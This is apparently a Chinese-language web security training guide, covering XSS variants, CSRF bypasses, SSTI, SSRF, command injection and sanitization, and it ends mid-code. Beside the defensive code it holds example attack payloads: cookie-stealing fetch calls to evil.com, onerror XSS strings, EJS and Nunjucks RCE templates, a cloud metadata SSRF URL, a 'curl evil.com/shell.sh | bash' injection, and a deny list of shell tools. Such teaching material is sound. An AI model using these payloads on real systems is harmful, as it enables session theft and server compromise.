# 🔐 Web 安全第六轮 — 高级攻防与工程化实践

> 专项训练 13:00 | 2026-04-30
> 主题: 高级 XSS 变种 / CSRF 绕过 / 服务端注入 / 现代净化库 / CSP Level 3 / 安全工程化 / 攻防实验室

---

## 目录

1. [高级 XSS 变种与绕过技术](#1-高级-xss-变种与绕过技术)
2. [CSRF 高级绕过与防御](#2-csrf-高级绕过与防御)
3. [服务端注入攻击 (SSTI/SSRF/命令注入)](#3-服务端注入攻击-sstissrf命令注入)
4. [现代输入净化工程](#4-现代输入净化工程)
5. [CSP Level 3 与高级安全头](#5-csp-level-3-与高级安全头)
6. [安全工程化：安全左移与自动化](#6-安全工程化安全左移与自动化)
7. [攻防演练实验室](#7-攻防演练实验室)
8. [安全编码速查手册](#8-安全编码速查手册)

---

## 1. 高级 XSS 变种与绕过技术

### 1.1 DOM Clobbering — 被忽视的 DOM 注入

DOM Clobbering 利用 HTML 元素的 `id` 属性污染全局变量，绕过传统 XSS 过滤器。

```js
// --- 攻击向量 ---
// 攻击者注入以下 HTML：
// <form id="config"><input name="apiUrl" value="https://evil.com/hook"></form>
// <a id="config" href="https://evil.com">

// 受害应用代码：
const config = window.config || {};
// 在浏览器中，window.config 被 HTML 元素覆盖！
// config 现在是 HTMLFormElement，不是 {}

fetch(config.apiUrl + "/data");
// 实际请求: https://evil.com/hook/data

// --- 防御：对象冻结 + 严格初始化 ---
// File: src/security/dom-clobbering-defense.js

/**
 * DOM Clobbering 防御器
 * 原理：在解析任何 HTML 之前冻结关键全局变量
 */
class DOMClobberingDefense {
  constructor() {
    this.protectedGlobals = new Set();
  }

  /**
   * 在 <head> 中尽早执行，先于任何外部 HTML
   */
  protectGlobal(name, value) {
    if (name in window) {
      throw new Error(
        `[Security] Global "${name}" already exists — possible clobbering`,
      );
    }
    Object.defineProperty(window, name, {
      value: value,
      writable: false,
      configurable: false,
      enumerable: true,
    });
    this.protectedGlobals.add(name);
  }

  /**
   * 检测 DOM Clobbering 攻击
   */
  detectClobbering(name) {
    const global = window[name];
    if (global instanceof HTMLElement) {
      console.error(`[Security] DOM Clobbering detected on "${name}"`);
      return true;
    }
    return false;
  }

  /**
   * 批量保护配置对象
   */
  protectConfig(configObj) {
    for (const [key, value] of Object.entries(configObj)) {
      this.protectGlobal(key, value);
    }
  }
}

// 使用示例：在 <head> 最顶部
const defense = new DOMClobberingDefense();
defense.protectGlobal("config", {
  apiUrl: "https://api.myapp.com",
  timeout: 5000,
});

// 检测
if (defense.detectClobbering("config")) {
  // 触发安全响应：刷新页面 + 上报
  location.reload();
}
```

### 1.2 Mutation-Based XSS — MutationObserver 攻击面

```js
// --- 攻击向量 ---
// 攻击者通过 MutationObserver 监听 DOM 变化，
// 在框架渲染后注入恶意代码

// File: src/security/mutation-xss.js

/**
 * Mutation-Based XSS 攻防演示
 */
class MutationXSSDemo {
  /**
   * 攻击：利用框架渲染时机注入
   */
  static attackMutation() {
    // 攻击者代码（在第三方脚本中）
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        for (const node of mutation.addedNodes) {
          if (node.nodeType === 1 && node.classList?.contains("user-content")) {
            // 在用户内容渲染后立即注入
            const script = document.createElement("script");
            script.textContent =
              'fetch("https://evil.com?cookie=" + document.cookie)';
            node.appendChild(script);
          }
        }
      }
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true,
    });

    return observer;
  }

  /**
   * 防御：限制 MutationObserver 权限 + CSP
   */
  static defense() {
    // 1. CSP 阻止内联脚本执行
    // Content-Security-Policy: script-src 'self';

    // 2. 使用 Shadow DOM 隔离用户内容
    const container = document.createElement("div");
    const shadow = container.attachShadow({ mode: "closed" });
    shadow.innerHTML = '<div class="user-content"></div>';

    // Shadow DOM 内的脚本无法访问外部 document
    // MutationObserver 无法穿透 Shadow DOM

    // 3. 使用 Trusted Types 强制类型安全
    if (window.trustedTypes) {
      const policy = trustedTypes.createPolicy("sanitizer", {
        createHTML: (string) =>
          DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true }),
      });
      shadow.querySelector(".user-content").innerHTML =
        policy.createHTML(userInput);
    }

    return container;
  }
}
```

### 1.3 Script Gadgets — 利用合法脚本做 XSS

```js
// --- 攻击向量 ---
// 攻击者不注入恶意脚本，而是利用页面已有的合法脚本（gadget）
// 通过控制其参数或配置实现攻击

// File: src/security/script-gadgets.js

/**
 * Script Gadget 攻击演示
 *
 * 场景：页面加载了 analytics.js，攻击者通过 URL 参数控制其行为
 */
class ScriptGadgetDemo {
  /**
   * 攻击：利用第三方脚本的配置注入
   *
   * 假设 analytics.js 读取 window.ANALYTICS_CONFIG
   */
  static attackGadget() {
    // 攻击者通过 DOM Clobbering 或 URL 参数注入配置：
    // <script>
    //   window.ANALYTICS_CONFIG = {
    //     endpoint: 'https://evil.com/collect',
    //     beforeSend: (data) => {
    //       // 在发送前窃取数据
    //       fetch('https://evil.com/steal?data=' + JSON.stringify(data));
    //     }
    //   };
    // </script>
    // <script src="https://cdn.example.com/analytics.js"></script>

    console.warn(
      "[Security] Script gadget attack: third-party script hijacked via config",
    );
  }

  /**
   * 防御：Subresource Integrity (SRI) + 严格 CSP
   */
  static defense() {
    // 1. SRI: 确保第三方脚本未被篡改
    // <script src="https://cdn.example.com/analytics.js"
    //         integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
    //         crossorigin="anonymous"></script>

    // 2. CSP: 限制脚本来源
    // Content-Security-Policy:
    //   script-src 'self' https://cdn.example.com;
    //   object-src 'none';
    //   base-uri 'self';

    // 3. 使用 nonce 或 hash 而非 'unsafe-inline'
    // <script nonce="R4nd0mV4lu3">
    //   // 内联脚本
    // </script>

    // 4. 冻结第三方脚本可能读取的全局变量
    Object.freeze(window.ANALYTICS_CONFIG || {});
  }

  /**
   * 防御：Subresource Integrity 生成器
   */
  static generateSRI(filePath) {
    // Node.js 环境生成 SRI hash
    const crypto = require("crypto");
    const fs = require("fs");
    const content = fs.readFileSync(filePath);
    const hash = crypto.createHash("sha384").update(content).digest("base64");
    return `sha384-${hash}`;
  }
}
```

### 1.4 Blind XSS — 管理后台攻击

```js
// --- 攻击向量 ---
// Blind XSS: 注入的脚本在攻击者无法直接看到的页面执行
// 典型目标：管理后台、日志系统、客服面板

// File: src/security/blind-xss.js

/**
 * Blind XSS 攻防演示
 */
class BlindXSSDemo {
  /**
   * 攻击：通过日志系统注入
   */
  static attackViaLogging() {
    // 攻击者在输入中注入：
    const maliciousInput =
      "<img src=x onerror=\"fetch('https://evil.com/?'+document.cookie)\">";

    // 应用将用户输入写入日志（未转义）：
    // admin 在后台查看日志时，日志页面直接渲染了 HTML
    // → 脚本在管理员浏览器中执行
    // → 攻击者获得管理员 cookie/session

    console.warn("[Security] Blind XSS via logging system");
  }

  /**
   * 攻击：通过 User-Agent 注入
   */
  static attackViaUserAgent() {
    // 攻击者修改 User-Agent：
    // User-Agent: <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

    // 如果后台日志直接渲染 User-Agent 字段 → Blind XSS

    console.warn("[Security] Blind XSS via User-Agent header");
  }

  /**
   * 防御：全链路转义
   */
  static defense() {
    // 1. 日志系统：永远不要以 HTML 渲染用户输入
    // 2. 管理后台：使用文本模式查看日志，而非 HTML
    // 3. 输入净化：所有用户输入在进入系统前净化
    // 4. CSP: 即使注入成功也无法执行脚本
    // Content-Security-Policy: default-src 'self'; script-src 'self';
    // 5. 敏感操作二次验证：管理员操作需要二次确认
  }
}
```

---

## 2. CSRF 高级绕过与防御

### 2.1 SameSite Cookie 属性深度分析

```js
// --- File: src/security/csrf-samesite.js ---

/**
 * SameSite Cookie 属性深度分析
 *
 * SameSite=Lax: 默认值，GET 顶级导航允许携带 cookie
 * SameSite=Strict: 所有跨站请求都不携带 cookie
 * SameSite=None: 必须配合 Secure 属性
 *
 * 绕过技术：
 * 1. Lax+POST 绕过：利用 GET 到 POST 的重定向
 * 2. 子域名绕过：SameSite 不区分子域名
 * 3. 元刷新绕过：meta refresh 被视为顶级导航
 */
class SameSiteCSRF {
  /**
   * 攻击：Lax+POST 绕过
   *
   * 步骤：
   * 1. 受害者访问攻击者页面
   * 2. 攻击者页面发起 GET 请求到受害者站点的重定向端点
   * 3. 受害者站点返回 307/308 重定向到 POST 端点
   * 4. 浏览器跟随重定向，携带 cookie 发起 POST 请求
   */
  static attackLaxPostBypass() {
    // 攻击者页面：
    // <a href="https://victim.com/redirect?url=https://victim.com/api/transfer">Click</a>
    //
    // 受害者站点有危险的 307 重定向：
    // app.get('/redirect', (req, res) => {
    //   res.redirect(307, req.query.url); // 危险！
    // });
    //
    // 307 保持原始方法，所以如果重定向目标是 POST → CSRF 成功

    console.warn("[Security] SameSite Lax bypass via 307 redirect");
  }

  /**
   * 防御：多层 CSRF 防护
   */
  static defense() {
    // 1. Cookie 设置：
    // Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly; Path=/
    // 2. 自定义请求头（CORS 预检会阻止跨站）：
    // X-Requested-With: XMLHttpRequest
    // 3. 双重 Cookie 验证：
    // - 设置 cookie: XSRF-TOKEN=random-value
    // - 请求时携带: header X-XSRF-TOKEN=random-value
    // - 服务端验证两者一致
    // 4. SameSite 不能作为唯一防御，需要组合使用
  }
}
```

### 2.2 双重 Cookie Token 实现

```js
// --- File: src/security/double-cookie-csrf.js ---

/**
 * 双重 Cookie CSRF 防御 — 完整实现
 *
 * 原理：
 * 1. 服务端设置 Cookie: XSRF-TOKEN=随机值
 * 2. 前端读取 Cookie，在请求头中携带 X-XSRF-TOKEN
 * 3. 服务端验证 Cookie 和 Header 中的值一致
 *
 * 为什么有效？
 * - 攻击者无法读取受害者的 Cookie（同源策略）
 * - 攻击者无法设置自定义请求头（CORS 预检）
 */
class DoubleCookieCSRF {
  /**
   * 服务端中间件
   */
  static createCSRFMiddleware(secret) {
    const crypto = require("crypto");

    return {
      /**
       * 生成 CSRF Token 并设置 Cookie
       */
      generateToken(req, res, next) {
        // 如果已有 token 则复用，否则生成新的
        let token = req.cookies["XSRF-TOKEN"];
        if (!token) {
          token = crypto.randomBytes(32).toString("hex");
          res.cookie("XSRF-TOKEN", token, {
            httpOnly: false, // 必须 false，前端需要读取
            secure: true, // 仅 HTTPS
            sameSite: "strict",
            maxAge: 3600000, // 1 小时
            path: "/",
          });
        }
        req.csrfToken = token;
        next();
      },

      /**
       * 验证 CSRF Token
       */
      verifyToken(req, res, next) {
        // 只验证非安全方法
        const safeMethods = ["GET", "HEAD", "OPTIONS"];
        if (safeMethods.includes(req.method)) {
          return next();
        }

        const cookieToken = req.cookies["XSRF-TOKEN"];
        const headerToken = req.headers["x-xsrf-token"];

        if (!cookieToken || !headerToken) {
          return res.status(403).json({ error: "CSRF token missing" });
        }

        // 常量时间比较，防止时序攻击
        if (
          !crypto.timingSafeEqual(
            Buffer.from(cookieToken),
            Buffer.from(headerToken),
          )
        ) {
          return res.status(403).json({ error: "CSRF token mismatch" });
        }

        next();
      },
    };
  }

  /**
   * 前端拦截器（Axios）
   */
  static axiosInterceptor() {
    return {
      request: (config) => {
        const token = document.cookie
          .split("; ")
          .find((row) => row.startsWith("XSRF-TOKEN="))
          ?.split("=")[1];

        if (token) {
          config.headers["X-XSRF-TOKEN"] = token;
        }
        return config;
      },
    };
  }

  /**
   * 前端拦截器（Fetch）
   */
  static fetchWrapper(url, options = {}) {
    const token = document.cookie
      .split("; ")
      .find((row) => row.startsWith("XSRF-TOKEN="))
      ?.split("=")[1];

    const headers = {
      ...options.headers,
      ...(token && { "X-XSRF-TOKEN": token }),
    };

    return fetch(url, { ...options, headers });
  }
}
```

### 2.3 CSRF 攻击面完整映射

```js
// --- File: src/security/csrf-attack-surface.js ---

/**
 * CSRF 攻击面完整映射
 *
 * 识别所有可能被 CSRF 攻击的端点
 */
class CSRFAttackSurface {
  /**
   * 扫描应用中的 CSRF 风险端点
   */
  static scanEndpoints(endpoints) {
    const risks = [];

    for (const ep of endpoints) {
      const risk = {
        path: ep.path,
        method: ep.method,
        riskLevel: "safe",
        issues: [],
        recommendations: [],
      };

      // 检查 1: 非安全方法（POST/PUT/DELETE/PATCH）
      if (!["GET", "HEAD", "OPTIONS"].includes(ep.method)) {
        risk.riskLevel = "high";
        risk.issues.push("Non-safe HTTP method");

        // 检查 2: 是否有 CSRF 保护
        if (!ep.hasCSRFProtection) {
          risk.riskLevel = "critical";
          risk.issues.push("No CSRF protection");
          risk.recommendations.push(
            "Add double-cookie token or SameSite cookie",
          );
        }

        // 检查 3: 是否依赖 Cookie 认证
        if (ep.authType === "cookie") {
          risk.issues.push("Cookie-based authentication");
          risk.recommendations.push(
            "Consider Bearer token for state-changing operations",
          );
        }

        // 检查 4: Content-Type 是否为 application/x-www-form-urlencoded
        if (ep.contentType === "application/x-www-form-urlencoded") {
          risk.issues.push("Form-encoded content type — easy to forge");
          risk.recommendations.push(
            "Require application/json (triggers CORS preflight)",
          );
        }
      }

      // 检查 5: GET 请求是否有副作用
      if (ep.method === "GET" && ep.hasSideEffects) {
        risk.riskLevel = "critical";
        risk.issues.push("GET request with side effects — violates HTTP spec");
        risk.recommendations.push("Change to POST/PUT/DELETE");
      }

      risks.push(risk);
    }

    return risks.filter((r) => r.riskLevel !== "safe");
  }

  /**
   * 生成 CSRF 防护报告
   */
  static generateReport(risks) {
    const summary = {
      total: risks.length,
      critical: risks.filter((r) => r.riskLevel === "critical").length,
      high: risks.filter((r) => r.riskLevel === "high").length,
      medium: risks.filter((r) => r.riskLevel === "medium").length,
    };

    return { summary, details: risks };
  }
}

// 使用示例
const endpoints = [
  {
    path: "/api/transfer",
    method: "POST",
    authType: "cookie",
    hasCSRFProtection: false,
    contentType: "application/x-www-form-urlencoded",
  },
  {
    path: "/api/user/profile",
    method: "PUT",
    authType: "cookie",
    hasCSRFProtection: true,
    contentType: "application/json",
  },
  { path: "/api/logout", method: "GET", hasSideEffects: true },
];

const risks = CSRFAttackSurface.scanEndpoints(endpoints);
console.log(CSRFAttackSurface.generateReport(risks));
```

---

## 3. 服务端注入攻击 (SSTI/SSRF/命令注入)

### 3.1 服务端模板注入 (SSTI)

```js
// --- File: src/security/ssti-attack-defense.js ---

/**
 * 服务端模板注入 (SSTI) 攻防
 *
 * SSTI: 攻击者注入模板语法到服务端模板引擎，
 * 实现远程代码执行 (RCE)
 */
class SSTIAttackDefense {
  /**
   * 攻击：EJS 模板注入
   */
  static attackEJS() {
    // 危险代码：
    // const ejs = require('ejs');
    // app.post('/greet', (req, res) => {
    //   const name = req.body.name;
    //   // 危险：用户输入直接作为模板
    //   const html = ejs.render(req.body.template, { name });
    //   res.send(html);
    // });
    //
    // 攻击载荷：
    // POST /greet
    // template=<%= global.process.mainModule.require('child_process').execSync('whoami') %>
    //
    // → 攻击者执行任意服务器命令！

    console.warn("[Security] SSTI via EJS template injection");
  }

  /**
   * 攻击：Nunjucks 模板注入
   */
  static attackNunjucks() {
    // Nunjucks 模板注入载荷：
    // {{ constructor.constructor('return process')().mainModule.require('child_process').execSync('id') }}

    console.warn("[Security] SSTI via Nunjucks template injection");
  }

  /**
   * 攻击：JS 模板字符串注入
   */
  static attackTemplateLiteral() {
    // 危险代码：
    // const template = req.body.template; // 用户控制
    // const result = eval('`' + template + '`');
    //
    // 攻击载荷：${require('child_process').execSync('whoami')}

    console.warn("[Security] Template literal injection via eval");
  }

  /**
   * 防御：安全模板渲染
   */
  static defense() {
    // 1. 永远不要将用户输入作为模板内容
    // 2. 使用安全的模板引擎配置
    // 3. 限制模板引擎的访问权限
    // 4. 使用白名单允许的模板
    // 5. 沙箱执行环境
    // EJS 安全配置示例：
    // const ejs = require('ejs');
    // const options = {
    //   escape: (str) => myEscapeFunction(str),
    //   // 不要使用 user-supplied templates
    // };
  }
}
```

### 3.2 SSRF (服务端请求伪造)

```js
// --- File: src/security/ssrf-attack-defense.js ---

/**
 * SSRF 攻防 — 服务端请求伪造
 *
 * SSRF: 攻击者诱导服务端发起恶意请求，
 * 访问内网资源或云元数据
 */
class SSRFAttackDefense {
  /**
   * 攻击：云元数据访问
   */
  static attackCloudMetadata() {
    // 危险代码：
    // app.get('/fetch', async (req, res) => {
    //   const url = req.query.url;
    //   const response = await fetch(url);
    //   res.send(await response.text());
    // });
    //
    // 攻击载荷：
    // GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/credentials/
    //
    // → 获取云服务器的 IAM 凭证！
    // → 攻击者可以完全控制云服务器

    console.warn("[Security] SSRF accessing cloud metadata");
  }

  /**
   * 攻击：内网扫描
   */
  static attackInternalNetwork() {
    // 攻击者通过 SSRF 扫描内网：
    // GET /fetch?url=http://10.0.0.1:6379/INFO
    // GET /fetch?url=http://10.0.0.2:27017/
    // GET /fetch?url=http://192.168.1.1/admin
    //
    // → 发现内网服务，进一步攻击

    console.warn("[Security] SSRF internal network scanning");
  }

  /**
   * 防御：URL 验证 + 网络隔离
   */
  static createSSRFMiddleware() {
    const dns = require("dns").promises;
    const net = require("net");

    // 私有 IP 范围
    const PRIVATE_RANGES = [
      /^10\./, // 10.0.0.0/8
      /^172\.(1[6-9]|2\d|3[01])\./, // 172.16.0.0/12
      /^192\.168\./, // 192.168.0.0/16
      /^127\./, // 127.0.0.0/8
      /^0\./, // 0.0.0.0/8
      /^169\.254\./, // 169.254.0.0/16 (link-local)
      /^localhost$/i,
      /^\[/, // IPv6
    ];

    function isPrivateIP(ip) {
      return PRIVATE_RANGES.some((range) => range.test(ip));
    }

    return async function ssrfMiddleware(req, res, next) {
      const url = req.query.url || req.body.url;
      if (!url) return next();

      try {
        const parsed = new URL(url);

        // 检查 1: 只允许 HTTP/HTTPS
        if (!["http:", "https:"].includes(parsed.protocol)) {
          return res.status(400).json({ error: "Only HTTP/HTTPS allowed" });
        }

        // 检查 2: 解析 DNS 并检查 IP
        const resolvedIP = await dns.lookup(parsed.hostname);
        const ip =
          typeof resolvedIP === "string" ? resolvedIP : resolvedIP.address;

        if (isPrivateIP(ip)) {
          return res
            .status(403)
            .json({ error: "Private IP addresses not allowed" });
        }

        // 检查 3: 白名单域名
        const allowedDomains = ["api.example.com", "cdn.example.com"];
        if (!allowedDomains.includes(parsed.hostname)) {
          return res.status(403).json({ error: "Domain not in allowlist" });
        }

        // 检查 4: 重定向防护 — 获取最终 IP
        // 攻击者可能通过 DNS rebinding 绕过
        // 需要在请求后再次验证最终 IP

        req.ssrfVerified = true;
        next();
      } catch (err) {
        return res.status(400).json({ error: "Invalid URL" });
      }
    };
  }
}
```

### 3.3 命令注入

```js
// --- File: src/security/command-injection.js ---

/**
 * 命令注入攻防
 */
class CommandInjection {
  /**
   * 攻击：直接拼接用户输入到命令
   */
  static attack() {
    // 危险代码：
    // const { exec } = require('child_process');
    // app.post('/ping', (req, res) => {
    //   const host = req.body.host;
    //   exec(`ping -c 4 ${host}`, (err, stdout) => {
    //     res.send(stdout);
    //   });
    // });
    //
    // 攻击载荷：
    // POST /ping
    // host=8.8.8.8; cat /etc/passwd
    //
    // 或：host=8.8.8.8 && curl https://evil.com/shell.sh | bash

    console.warn("[Security] Command injection via child_process.exec");
  }

  /**
   * 防御：使用 spawn/execFile + 输入验证
   */
  static defense() {
    const { execFile } = require("child_process");

    // 安全写法：
    // app.post('/ping', (req, res) => {
    //   const host = req.body.host;
    //
    //   // 1. 严格验证输入
    //   if (!/^[a-zA-Z0-9._-]+$/.test(host)) {
    //     return res.status(400).json({ error: 'Invalid host' });
    //   }
    //
    //   // 2. 使用 execFile 而非 exec（参数作为数组传递，不会被 shell 解析）
    //   execFile('ping', ['-c', '4', host], { timeout: 10000 }, (err, stdout) => {
    //     if (err) return res.status(500).json({ error: 'Ping failed' });
    //     res.send(stdout);
    //   });
    // });

    console.log("[Security] Safe command execution pattern");
  }

  /**
   * 通用安全命令执行工具
   */
  static safeExec(command, args, options = {}) {
    const { execFile } = require("child_process");

    // 验证：command 不在黑名单中
    const dangerousCommands = [
      "rm",
      "mkfs",
      "dd",
      "curl",
      "wget",
      "bash",
      "sh",
      "zsh",
    ];
    if (dangerousCommands.includes(command)) {
      throw new Error(`Command "${command}" is not allowed`);
    }

    // 验证：所有参数只包含安全字符
    for (const arg of args) {
      if (typeof arg !== "string") {
        throw new Error("All arguments must be strings");
      }
      if (!/^[-a-zA-Z0-9._/ :@%+~=,]+$/.test(arg)) {
        throw new Error(`Argument contains unsafe characters: ${arg}`);
      }
    }

    return new Promise((resolve, reject) => {
      execFile(
        command,
        args,
        {
          timeout: options.timeout || 30000,
          maxBuffer: options.maxBuffer || 1024 * 1024,
          cwd: options.cwd || process.cwd(),
          env: options.env || { PATH: "/usr/bin:/bin" }, // 最小化环境变量
        },
        (err, stdout, stderr) => {
          if (err) return reject(err);
          resolve({ stdout, stderr });
        },
      );
    });
  }
}
```

---

## 4. 现代输入净化工程

### 4.1 DOMPurify 深度配置

```js
// --- File: src/security/dompurify-advanced.js ---

/**
 * DOMPurify 高级配置与实战
 *
 * DOMPurify 是目前最安全的 HTML 净化库
 * 支持 Trusted Types、Shadow DOM、自定义钩子
 */
class DOMPurifyAdvanced {
  /**
   * 基础净化 — 博客评论场景
   */
  static sanitizeBlogComment(dirty) {
    // 允许基本的格式化标签
    const clean = DOMPurify.sanitize(dirty, {
      ALLOWED_TAGS: [
        "b",
        "i",
        "em",
        "strong",
        "a",
        "p",
        "br",
        "ul",
        "ol",
        "li",
        "code",
        "pre",
        "blockquote",
      ],
      ALLOWED_ATTR: ["href", "title"],
      ALLOWED_URI_PROTOCOLS: ["http", "https", "mailto"],
      // 禁止 javascript: 协议
      FORBID_PROTOCOLS: ["javascript"],
      // 链接添加 rel 属性
      ADD_ATTR: ["rel"],
      ADD_TAGS: [],
      // 保留换行
      KEEP_CONTENT: true,
      // 返回 TrustedHTML（如果浏览器支持）
      RETURN_TRUSTED_TYPE: typeof trustedTypes !== "undefined",
    });

    return clean;
  }

  /**
   * 富文本净化 — 博客文章场景
   */
  static sanitizeBlogPost(dirty) {
    return DOMPurify.sanitize(dirty, {
      ALLOWED_TAGS: [
        "h1",
        "h2",
        "h3",
        "h4",
        "h5",
        "h6",
        "p",
        "br",
        "hr",
        "div",
        "span",
        "b",
        "i",
        "em",
        "strong",
        "u",
        "s",
        "strike",
        "a",
        "img",
        "ul",
        "ol",
        "li",
        "table",
        "thead",
        "tbody",
        "tr",
        "th",
        "td",
        "blockquote",
        "pre",
        "code",
        "details",
        "summary",
        "section",
        "article",
        "nav",
      ],
      ALLOWED_ATTR: [
        "href",
        "title",
        "alt",
        "src",
        "width",
        "height",
        "class",
        "id",
        "style",
        "colspan",
        "rowspan",
        "target",
        "rel",
      ],
      ALLOWED_URI_PROTOCOLS: ["http", "https", "mailto", "tel"],
      FORBID_TAGS: [
        "script",
        "object",
        "embed",
        "form",
        "input",
        "textarea",
        "select",
      ],
      FORBID_ATTR: ["onerror", "onload", "onclick", "onmouseover", "onfocus"],
      ADD_ATTR: ["target", "rel"],
      ADD_URI_PROTOCOLS: [],
      WHOLE_DOCUMENT: false,
      SANITIZE_DOM: true,
      KEEP_CONTENT: true,
      RETURN_DOM: false,
      RETURN_DOM_FRAGMENT: false,
      RETURN_TRUSTED_TYPE: false,
    });
  }

  /**
   * 自定义钩子 — 自动为链接添加安全属性
   */
  static addLinkSafetyHook() {
    DOMPurify.addHook("afterSanitizeAttributes", (node) => {
      // 为所有链接添加 target="_blank" 和 rel="noopener noreferrer"
      if (node.tagName === "A" && node.hasAttribute("href")) {
        node.setAttribute("target", "_blank");
        node.setAttribute("rel", "noopener noreferrer");
      }

      // 为所有图片添加 referrerpolicy
      if (node.tagName === "IMG") {
        node.setAttribute("referrerpolicy", "no-referrer");
        // 限制图片尺寸
        if (!node.hasAttribute("width")) node.setAttribute("width", "100%");
        if (!node.hasAttribute("height")) node.setAttribute("height", "auto");
      }
    });
  }

  /**
   * 自定义钩子 — 检测并标记可疑内容
   */
  static addSuspiciousContentHook() {
    const suspiciousContents = [];

    DOMPurify.addHook("uponSanitizeElement", (node, data) => {
      // 检测潜在的 phishing 链接
      if (node.tagName === "A") {
        const href = node.getAttribute("href");
        if (href && (href.includes("login") || href.includes("verify"))) {
          suspiciousContents.push({
            type: "potential-phishing",
            element: "a",
            href: href,
            text: node.textContent,
          });
        }
      }

      // 检测大图片（可能的 DoS）
      if (node.tagName === "IMG") {
        const width = parseInt(node.getAttribute("width") || "0");
        const height = parseInt(node.getAttribute("height") || "0");
        if (width > 10000 || height > 10000) {
          suspiciousContents.push({
            type: "oversized-image",
            width,
            height,
          });
        }
      }
    });

    return suspiciousContents;
  }

  /**
   * Trusted Types 集成
   */
  static createTrustedTypesPolicy() {
    if (typeof trustedTypes === "undefined") {
      return null;
    }

    return trustedTypes.createPolicy("dompurify", {
      createHTML: (string) =>
        DOMPurify.sanitize(string, { RETURN_TRUSTED_TYPE: true }),
      createScriptURL: (string) => {
        // 只允许同域脚本
        try {
          const url = new URL(string, window.location.origin);
          if (url.origin === window.location.origin) {
            return string;
          }
        } catch (e) {
          /* invalid URL */
        }
        throw new TypeError("Invalid script URL");
      },
    });
  }
}
```

### 4.2 多层净化架构

```js
// --- File: src/security/multi-layer-sanitization.js ---

/**
 * 多层净化架构 — Defense in Depth
 *
 * 每一层都有独立的净化逻辑，
 * 即使一层被绕过，其他层仍然有效
 */
class MultiLayerSanitization {
  /**
   * Layer 1: 输入验证 (Validation)
   * 在数据进入系统前，验证格式和类型
   */
  static validateInput(value, schema) {
    const errors = [];

    // 类型检查
    if (schema.type && typeof value !== schema.type) {
      errors.push(`Expected ${schema.type}, got ${typeof value}`);
    }

    // 长度检查
    if (schema.minLength && value.length < schema.minLength) {
      errors.push(`Minimum length is ${schema.minLength}`);
    }
    if (schema.maxLength && value.length > schema.maxLength) {
      errors.push(`Maximum length is ${schema.maxLength}`);
    }

    // 模式检查
    if (schema.pattern && !schema.pattern.test(value)) {
      errors.push(`Does not match pattern: ${schema.pattern}`);
    }

    // 白名单检查
    if (schema.whitelist && !schema.whitelist.includes(value)) {
      errors.push(`Value not in whitelist`);
    }

    return {
      valid: errors.length === 0,
      errors,
      value: errors.length === 0 ? value : null,
    };
  }

  /**
   * Layer 2: 上下文感知转义 (Context-Aware Escaping)
   * 根据输出上下文选择不同的转义策略
   */
  static escapeForContext(value, context) {
    const htmlEntities = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;",
      "'": "&#x27;",
      "/": "&#x2F;",
      "`": "&#96;",
    };

    const jsEntities = {
      "\\": "\\\\",
      "'": "\\'",
      '"': '\\"',
      "\n": "\\n",
      "\r": "\\r",
      "\t": "\\t",
      "</": "<\\/",
      "-->": "--\\>",
    };

    const cssEntities = {
      '"': '\\"',
      "'": "\\'",
      "\\": "\\\\",
      "/": "\\/",
      "<": "\\3C",
      ">": "\\3E",
      "&": "\\26",
      ";": "\\3B",
    };

    const urlEntities = {
      "&": "%26",
      "+": "%2B",
      " ": "%20",
      "#": "%23",
      "%": "%25",
      "?": "%3F",
      "=": "%3D",
      "<": "%3C",
      ">": "%3E",
    };

    switch (context) {
      case "html":
        return String(value).replace(/[&<>"'`/]/g, (c) => htmlEntities[c]);

      case "javascript":
        return String(value).replace(
          /[\\'"\/\n\r\t<\-]/g,
          (c) => jsEntities[c],
        );

      case "css":
        return String(value).replace(/["'\\\/<>&;]/g, (c) => cssEntities[c]);

      case "url":
        return encodeURIComponent(String(value));

      case "attribute":
        return String(value).replace(/[&<>"'`]/g, (c) => htmlEntities[c]);

      default:
        return String(value);
    }
  }

  /**
   * Layer 3: HTML 净化 (Sanitization)
   * 对富文本使用 DOMPurify
   */
  static sanitizeHTML(dirty) {
    if (typeof DOMPurify !== "undefined") {
      return DOMPurify.sanitize(dirty);
    }
    // 降级方案：基础 HTML 转义
    return this.escapeForContext(dirty, "html");
  }

  /**
   * Layer 4: 输出编码 (Output Encoding)
   * 在输出到响应时再次编码
   */
  static encodeOutput(value, contentType) {
    switch (contentType) {
      case "application/json":
        // JSON.stringify 自动处理转义
        return JSON.stringify(value);

      case "text/html":
        return this.escapeForContext(value, "html");

      case "application/javascript":
        return this.escapeForContext(value, "javascript");

      default:
        return String(value);
    }
  }

  /**
   * 完整净化管道
   */
  static sanitizePipeline(value, options = {}) {
    const {
      validate = true,
      schema = null,
      context = "html",
      sanitizeHTML = false,
      encodeOutput = true,
      contentType = "text/html",
    } = options;

    let result = value;

    // Layer 1: 验证
    if (validate && schema) {
      const validation = this.validateInput(result, schema);
      if (!validation.valid) {
        return { success: false, error: validation.errors };
      }
      result = validation.value;
    }

    // Layer 2: 上下文转义
    if (context) {
      result = this.escapeForContext(result, context);
    }

    // Layer 3: HTML 净化
    if (sanitizeHTML) {
      result = this.sanitizeHTML(result);
    }

    // Layer 4: 输出编码
    if (encodeOutput) {
      result = this.encodeOutput(result, contentType);
    }

    return { success: true, value: result };
  }
}

// 使用示例
const userInput = "<script>alert(1)</script>";

// HTML 上下文
console.log(
  MultiLayerSanitization.sanitizePipeline(userInput, {
    context: "html",
    contentType: "text/html",
  }),
);
// → &lt;script&gt;alert(1)&lt;/script&gt;

// JSON 上下文
console.log(
  MultiLayerSanitization.sanitizePipeline(userInput, {
    context: "javascript",
    contentType: "application/json",
  }),
);
// → JSON 安全转义
```

### 4.3 服务端净化 (Node.js)

```js
// --- File: src/security/server-side-sanitization.js ---

/**
 * 服务端净化 — Node.js 环境
 *
 * 使用 sanitize-html 和 xss 库
 */
class ServerSideSanitization {
  /**
   * 使用 sanitize-html 净化 HTML
   */
  static sanitizeWithSanitizeHtml(dirty, options = {}) {
    const sanitizeHtml = require("sanitize-html");

    const defaultOptions = {
      allowedTags: sanitizeHtml.defaults.allowedTags.filter(
